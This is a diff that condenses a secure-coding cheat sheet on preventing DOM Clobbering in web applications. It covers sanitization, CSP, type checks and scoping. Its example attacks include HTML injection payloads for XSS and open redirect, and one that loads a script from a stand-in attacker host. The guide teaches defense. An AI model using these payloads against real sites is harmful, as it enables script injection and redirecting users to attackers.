@@ -2,25 +2,23 @@
 
 ## Introduction
 
-[DOM Clobbering](https://domclob.xyz/domc_wiki/#overview) is a type of code-reuse, HTML-only injection attack, where attackers confuse a web application by injecting HTML elements whose `id` or `name` attribute matches the name of security-sensitive variables or browser APIs, such as variables used for fetching remote content (e.g., script src), and overshadow their value.
+DOM Clobbering = code-reuse, HTML-only injection attack: attacker injects HTML elements whose `id` or `name` attribute matches name of security-sensitive variables or browser APIs (e.g., variables used to fetch remote content such as script src), overshadowing their value.
 
-It is particularly relevant when script injection is not possible, e.g., when filtered by HTML sanitizers, or mitigated by disallowing or controlling script execution. In these scenarios, attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving [Cross-Site Scripting (XSS)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
+Relevant when script injection impossible (filtered by HTML sanitizers, or script execution disallowed/controlled). Attacker still injects non-script HTML markup, turning initially secure markup into executable code → [Cross-Site Scripting (XSS)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
 
-**This cheat sheet is a list of guidelines, secure coding patterns, and practices to prevent or restrict the impact of DOM Clobbering in your web application.**
+**Guidelines, secure coding patterns, practices to prevent/restrict DOM Clobbering impact.**
 
 ## Background
 
-Before we dive into DOM Clobbering, let's refresh our knowledge with some basic Web background.
+Browser builds DOM tree on page load; JavaScript has read/write access.
 
-When a webpage is loaded, the browser creates a [DOM tree](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) that represents the structure and content of the page, and JavaScript code has read and write access to this tree.
-
-When creating the DOM tree, browsers also create an attribute for (some) named HTML elements on `window` and `document` objects. Named HTML elements are those having an `id` or `name` attribute. For example, the markup:
+While building DOM tree, browsers also create attribute for (some) named HTML elements on `window` and `document`. Named elements = those w/ `id` or `name` attribute. Example markup:
 
 ```html
 <form id=x name=x></form>
 ```
 
-creates named references to the form on `window` and `document`. The `name` attribute is needed for [named access on `document`](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem); a form's `id` alone does not provide that reference:
+creates named references to form on `window` and `document`. `name` attribute needed for named access on `document`; form's `id` alone doesn't provide that reference:
 
 ```js
 var obj1 = document.getElementById('x');
@@ -34,10 +32,9 @@ console.log(
 ); // true
 ```
 
-When accessing an attribute of `window` and `document` objects, named HTML element references come before lookups of built-in APIs and other attributes on `window` and `document` that developers have defined, also known as [named property accesses](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object). Developers unaware of such behavior may use the content of window/document attributes for sensitive operations, such as URLs for fetching remote content, and attackers can exploit it by injecting markups with colliding names. Similarly to custom attributes/variables, built-in browser APIs may be overshadowed by DOM Clobbering.
+Accessing `window`/`document` attribute: named HTML element references come before lookups of built-in APIs and developer-defined attributes (named property accesses). Developers unaware may use window/document attribute content for sensitive operations (e.g., URLs for fetching remote content); attacker injects markup w/ colliding names. Built-in browser APIs can be overshadowed too.
 
-If attackers are able to inject (non-script) HTML markup in the DOM tree,
-it can change the value of a variable that the web application relies on due to named property accesses, causing it to malfunction, expose sensitive data, or execute attacker-controlled scripts. DOM Clobbering works by taking advantage of this (legacy) behavior, causing a namespace collision between the execution environment (i.e., `window` and `document` objects), and JavaScript code.
+Attacker able to inject (non-script) HTML markup can change value of variable app relies on via named property accesses → malfunction, sensitive data exposure, attacker-controlled script execution. Exploits (legacy) behavior: namespace collision between execution environment (`window`, `document`) and JavaScript code.
 
 ### Example Attack 1
 
@@ -46,10 +43,10 @@ let redirectTo = window.redirectTo || '/profile/';
 location.assign(redirectTo);
 ```
 
-The attacker can:
+Attacker can:
 
-- inject the markup `<a id=redirectTo href='javascript:alert(1)'></a>` and obtain XSS.
-- inject the markup `<a id=redirectTo href='https://phishing.example/'></a>` and obtain open redirect.
+- inject `<a id=redirectTo href='javascript:alert(1)'></a>` → XSS.
+- inject `<a id=redirectTo href='https://phishing.example/'></a>` → open redirect.
 
 ### Example Attack 2
 
@@ -60,11 +57,11 @@ script.src = src;
 document.body.appendChild(script);
 ```
 
-The attacker can inject the markup `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` to load additional JavaScript code, and obtain arbitrary client-side code execution.
+Attacker injects `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` → loads additional JavaScript → arbitrary client-side code execution.
 
 ## Summary of Guidelines
 
-For quick reference, below is the summary of guidelines discussed next.
+Quick reference:
 
 |    | **Guidelines**                                                | Description                                                               |
 |----|---------------------------------------------------------------|---------------------------------------------------------------------------|
@@ -86,29 +83,29 @@ For quick reference, below is the summary of guidelines discussed next.
 
 ### \#1: HTML Sanitization
 
-Robust HTML sanitizers can prevent or restrict the risk of DOM Clobbering. They can do so in multiple ways. For example:
+Robust HTML sanitizers prevent/restrict DOM Clobbering risk. Ways:
 
-- completely remove named properties like `id` and `name`. While effective, this may hinder the usability when named properties are needed for legitimate functionalities.
-- namespace isolation, which can be, for example, prefixing the value of named properties by a constant string to limit the risk of naming collisions.
-- dynamically checking if named properties of the input mark has collisions with the existing DOM tree, and if that is the case, then remove named properties of the input markup.
+- Remove named properties like `id` and `name` entirely. Effective, but may hinder legitimate functionality needing them.
+- Namespace isolation, e.g., prefix named property values w/ constant string to limit naming collisions.
+- Dynamically check whether input markup's named properties collide w/ existing DOM tree; if so, remove them from input markup.
 
-OWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) or the [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) for HTML sanitization.
+OWASP recommends DOMPurify or Sanitizer API for HTML sanitization.
 
 #### DOMPurify Sanitizer
 
-By default, DOMPurify removes all clobbering collisions with **built-in** APIs and properties (using the enabled-by-default `SANITIZE_DOM` configuration option).
+By default DOMPurify removes all clobbering collisions w/ **built-in** APIs/properties (enabled-by-default `SANITIZE_DOM` option).
 
-To be protected against clobbering of custom variables and properties as well, you need to enable the `SANITIZE_NAMED_PROPS` config:
+To also protect custom variables/properties, enable `SANITIZE_NAMED_PROPS`:
 
 ```js
 var clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});
 ```
 
-This would isolate the namespace of named properties and JavaScript variables by prefixing them with `user-content-` string.
+Isolates namespace of named properties vs JavaScript variables by prefixing w/ `user-content-`.
 
 #### Sanitizer API
 
-Use the browser's [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer) only where the required methods are supported. Start with its default configuration and explicitly disallow `id` and `name` using [`removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/removeAttribute), which removes the attribute from all elements:
+Use browser Sanitizer API only where required methods supported. Start from default configuration; explicitly disallow `id` and `name` via [`removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/removeAttribute) (removes attribute from all elements):
 
 ```js
 const sanitizerInstance = new Sanitizer();
@@ -117,74 +114,74 @@ sanitizerInstance.removeAttribute('name');
 containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
 ```
 
-This example assumes the application does not need `id` or `name` attributes in the untrusted markup. In unsupported browsers, use the DOMPurify configuration above; do not fall back to inserting unsanitized HTML.
+Example assumes app needs no `id`/`name` attributes in untrusted markup. Unsupported browsers: use DOMPurify configuration above; never fall back to inserting unsanitized HTML.
 
 ### \#2: Content-Security Policy
 
-[Content-Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) is a set of rules that tell the browser which resources are allowed to be loaded on a web page. By restricting the sources of JavaScript files (e.g., with the [script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) directive), CSP can prevent malicious code from being injected into the page.
+Content-Security Policy (CSP) = rules telling browser which resources may load on page. Restricting JavaScript sources (e.g., script-src directive) prevents malicious code injection.
 
-**Note:** CSP can only mitigate **some variants** of DOM clobbering attacks, such as when attackers attempt to load new scripts by clobbering script sources, but not when already-present code can be abused for code execution, e.g., clobbering the parameters of code evaluation constructs like `eval()`.
+**Note:** CSP mitigates only **some variants** of DOM clobbering, e.g., attacker loading new scripts by clobbering script sources; not when already-present code is abusable for code execution, e.g., clobbering parameters of code evaluation constructs like `eval()`.
 
 ### \#3: Freezing Application Configuration Objects
 
-Use [Object.freeze()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze#description) only as an additional control for application-owned configuration objects initialized with trusted values and retained in local scope. It prevents replacement of their own data properties, but is shallow: nested objects and values returned by getters can still change.
+Use Object.freeze() only as additional control for app-owned configuration objects initialized w/ trusted values and retained in local scope. Prevents replacement of own data properties but is shallow: nested objects and getter return values can still change.
 
-Do not rely on freezing `window`, `document`, or DOM elements to prevent named-property clobbering. For example, [`window` rejects attempts to prevent extensions](https://html.spec.whatwg.org/multipage/nav-history-apis.html#windowproxy-preventextensions), so `Object.freeze(window)` throws. Use [HTML sanitization](#1-html-sanitization) and [local variables](#11-limit-variables-to-local-scope) to avoid attacker-controlled named-property lookups.
+Don't rely on freezing `window`, `document`, or DOM elements to prevent named-property clobbering. E.g., `window` rejects attempts to prevent extensions, so `Object.freeze(window)` throws. Use [HTML sanitization](#1-html-sanitization) + [local variables](#11-limit-variables-to-local-scope) to avoid attacker-controlled named-property lookups.
 
 ## Secure Coding Guidelines
 
-DOM Clobbering can be avoided by defensive programming and adhering to a few coding patterns and guidelines.
+Avoid DOM Clobbering via defensive programming + coding patterns below.
 
 ### \#4: Validate All Inputs to DOM Tree
 
-Before inserting any markup into the webpage's DOM tree, sanitize `id` and `name` attributes (see [HTML sanitization](#1-html-sanitization)).
+Before inserting any markup into DOM tree, sanitize `id` and `name` attributes (see [HTML sanitization](#1-html-sanitization)).
 
 ### \#5: Use Explicit Variable Declarations
 
-When initializing variables, always use a variable declarator like `var`, `let` or `const`, which prevents clobbering of the variable.
+Always initialize variables w/ declarator `var`, `let` or `const`; prevents clobbering of variable.
 
-**Note:** Declaring a variable with `let` does not create a property on `window`, unlike `var`. Therefore, `window.VARNAME` can still be clobbered (assuming `VARNAME` is the name of the variable).
+**Note:** `let` declaration creates no property on `window` (unlike `var`). So `window.VARNAME` can still be clobbered (assuming `VARNAME` is variable name).
 
 ### \#6: Do Not Use Document and Window for Global Variables
 
-Avoid using objects like `document` and `window` for storing global variables, because they can be easily manipulated. (see, e.g., [here](https://domclob.xyz/domc_wiki/indicators/patterns.html#do-not-use-document-for-global-variables)).
+Don't store global variables in `document`/`window`; easily manipulated.
 
 ### \#7: Do Not Trust Document Built-in APIs Before Validation
 
-Document properties, including built-in ones, are always overshadowed by DOM Clobbering, even right after they are assigned a value.
+Document properties, incl. built-in, always overshadowed by DOM Clobbering, even right after assignment.
 
-**Hint:** This is due to the so-called [named property visibility algorithm](https://webidl.spec.whatwg.org/#legacy-platform-object-abstract-ops), where named HTML element references come before lookups of built-in APIs and other attributes on `document`.
+**Hint:** Cause: named property visibility algorithm; named HTML element references precede lookups of built-in APIs and other `document` attributes.
 
 ### \#8: Enforce Type Checking
 
-Always check the type of `document` and `window` properties before using them in sensitive operations, e.g., using the [`instanceof`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof) operator.
+Always check type of `document`/`window` properties before sensitive operations, e.g., [`instanceof`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof).
 
-**Hint:** When an object is clobbered, it would refer to an [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) instance, which may not be the expected type.
+**Hint:** Clobbered object refers to [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) instance, likely unexpected type.
 
 ### \#9: Use Strict Mode
 
-Use `strict` mode to prevent unintended global variable creation, and to [raise an error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Read-only) when read-only properties are attempted to be over-written.
+Use `strict` mode: prevents unintended global variable creation, and raises error on overwriting read-only properties.
 
 ### \#10: Apply Browser Feature Detection
 
-Instead of relying on browser-specific features or properties, use feature detection to determine whether a feature is supported before using it. This can help prevent errors and DOM Clobbering that might arise when using those features in unsupported browsers.
+Use feature detection, not browser-specific features/properties, to check support before use. Prevents errors + DOM Clobbering from unsupported-browser use.
 
-**Hint:** Unsupported feature APIs can act as an undefined variable/property in unsupported browsers, making them clobberable.
+**Hint:** Unsupported feature APIs act as undefined variable/property in unsupported browsers → clobberable.
 
 ### \#11: Limit Variables to Local Scope
 
-Global variables are more prone to being overwritten by DOM Clobbering. Whenever possible, use local variables and object properties.
+Global variables more prone to DOM Clobbering overwrite. Use local variables + object properties whenever possible.
 
 ### \#12: Use Unique Variable Names In Production
 
-Using unique variable names may help prevent naming collisions that could lead to accidental overwrites.
+Unique variable names help prevent naming collisions causing accidental overwrites.
 
 ### \#13: Use Object-oriented Programming Techniques like Encapsulation
 
-Encapsulating variables and functions within objects or classes can help prevent them from being overwritten. By making them private, they cannot be accessed from outside the object, making them less prone to DOM Clobbering.
+Encapsulate variables/functions in objects/classes to prevent overwrite. Private members inaccessible from outside object → less prone to DOM Clobbering.
 
 ## References
 
-- [WHATWG HTML: Named Access on the Window Object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object)
-- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
-- [WHATWG Web IDL: Legacy Platform Object Abstract Operations](https://webidl.spec.whatwg.org/#legacy-platform-object-abstract-ops)
+- WHATWG HTML: Named Access on the Window Object
+- DOMPurify Documentation
+- WHATWG Web IDL: Legacy Platform Object Abstract Operations
